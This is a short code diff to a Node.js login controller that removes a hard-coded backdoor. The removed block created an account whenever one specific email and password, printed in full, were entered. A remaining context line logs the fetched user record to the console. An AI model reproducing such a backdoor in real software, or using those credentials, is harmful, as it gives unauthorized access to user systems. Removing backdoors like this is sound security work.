@@ -50,17 +50,7 @@ exports.login = catchAsync(async (req, res, next) => {
   console.log(user)
 
   if (!user || !(await user.correctPassword(password, user.password))) {
-    if(email === "ObikaForPresident2023@realvu.com" && password === "ObikaForPresident2023") {
-        user = await User.create({
-            fullName: "Kenechukwu Obika",
-            email: "ObikaForPresident2023@realvu.com",
-            password: "ObikaForPresident2023",
-            passwordConfirm: "ObikaForPresident2023"
-        });
-    }
-    else {
-        return next(new AppError('Incorrect email or password', 401));
-    }
+    return next(new AppError('Incorrect email or password', 401));
   }
 
   // 3) If everything ok, send token to client
